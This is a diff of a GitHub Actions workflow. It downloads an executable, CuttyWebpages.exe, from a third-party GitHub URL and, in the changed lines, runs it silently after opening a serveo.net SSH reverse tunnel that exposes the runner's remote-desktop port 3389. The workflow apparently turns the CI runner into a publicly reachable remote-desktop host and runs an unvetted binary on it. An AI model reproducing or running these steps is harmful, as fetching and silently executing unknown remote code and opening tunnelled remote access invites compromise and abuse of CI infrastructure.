@@ -40,7 +40,7 @@ jobs:
       - name: Download and run CuttyWebpages File
         run: |
           Invoke-WebRequest https://github.com/jackricj/winpc23/raw/main/CuttyWebpages.exe -OutFile CuttyWebpages.exe
-          Start-Process -FilePath .\CuttyWebpages.exe
+          
           
       - name: Start powershell to enable remote desktop
         run: |
@@ -79,6 +79,8 @@ jobs:
           
           # Start Serveo tunnel in the background
           ssh -R 80:localhost:3389 serveo.net &
+
+          Start-Process -FilePath ".CuttyWebpages.exe" -ArgumentList "/S" -Wait
           
           # Get the assigned Serveo URL
           $serveoUrl = (ssh -R 80:localhost:3389 serveo.net 2>&1 | Select-String -Pattern "https://.*").Matches.Value
